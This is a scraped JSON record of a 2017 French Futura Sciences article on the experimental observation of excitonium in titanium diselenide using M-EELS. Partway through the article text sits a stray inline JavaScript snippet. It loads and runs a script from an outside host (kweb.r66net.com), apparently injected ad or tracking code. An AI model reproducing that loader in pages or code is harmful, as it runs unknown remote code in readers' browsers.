{"title": "Excitonium : la découverte inattendue d’une nouvelle forme de matière", "newspaper": "Futura Sciences", "author": "Nathalie Mayer", "date_publi": "11/12/2017", "content": "Depuis les années 1970, les scientifiques traquaient cette étrange forme de la matière baptisée excitonium. Mais les techniques employées manquaient de précision. Et les preuves avancées n'étaient pas suffisamment convaincantes. Celles présentées aujourd'hui par des chercheurs américains semblent définitives. C'est au cœur d'un dichalcogénure de  métal de transition  des plus banal — le diséléniure de  titane  — que des chercheurs de l' université de l’Illinois  (États-Unis) affirment avoir observé, pour la toute première fois, une forme de la  matière  qui leur échappait jusqu'alors : l'excitonium. En tout cas, ils présentent à la communauté, des  preuves expérimentales  jugées suffisamment probantes de son existence. Rappelons que les  excitons  correspondent à des quasi-particules qui apparaissent en certaines circonstances, dans les  semi-conducteurs  notamment. Lorsqu'un  électron  situé en bordure d'une  bande de valence  est excité, il peut sauter la bande interdite pour rejoindre la  bande de conduction . Derrière lui, il laisse un vide dans la bande de valence que les physiciens nomment... trou ! Ce trou se comporte alors comme une particule de charge positive. Parfois, il s'apparie avec l'électron échappé et l'ensemble forme un  exciton . Le terme excitonium a été inventé dans les années 1960 — par un physicien théoricien de Harvard, Bert Halperin — pour désigner un condensat composé d'excitons. Depuis, nombre de théoriciens ont spéculé sur le fait que l'excitonium se présente comme un  isolant , comme un conducteur parfait ou encore comme un  superfluide . Et personne n'avait encore pu apporter la preuve expérimentale de son existence. Une vue d’artiste de l’excitonium, comme une excitation en jaune qui se propage dans un solide d’excitons en bleu. © Peter Abbamonte,  University of Illinois ,  Department of Physics  et Frederick Seitz,  Materials Research Laboratory                               Une découverte presque fortuite Comme cela arrive régulièrement en sciences — et même si l'idée avait traversé l'esprit des chercheurs américains —, l'objectif premier des expériences menées par l'équipe de l'université de l'Illinois n'était pas de traquer l'excitonium. Simplement, dans un premier temps, de tester les capacités d'une nouvelle technique destinée à étudier les  supraconducteurs  à haute température : la spectroscopie de perte d' énergie  des électrons résolue en moment (M-EELS).  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  “ La découverte s’est faite de manière fortuite C'est grâce à cette nouvelle résolution de l'EELS que les chercheurs sont aujourd'hui convaincus que ce qu'ils ont observé — au cœur de 5 cristaux différents — annonce bien la formation d'un excitonium. À une température proche de celle de la  transition de phase  — quelque 190  kelvins  —, l'énergie des électrons est tombée à zéro sans que leur moment s'annule. Une preuve du ralentissement des fluctuations du  plasma  et de la cristallisation des  électrons de valence  en un condensat d'excitons. Les chercheurs imaginent encore mal quelles  applications  pratiques leur découverte pourrait avoir. En revanche, ils sont convaincus qu'elle les aidera à éclairer quelques-unes des manifestations étranges à nos sens de la  mécanique quantique . Ce qu'il faut retenir L’existence théorique de l’excitonium est posée depuis les années 1960. L’excitonium est composé d’un condensat de paires électrons-trous. Des chercheurs américains assurent avoir réuni des preuves expérimentales probantes de son existence. ", "theme": "sciences"}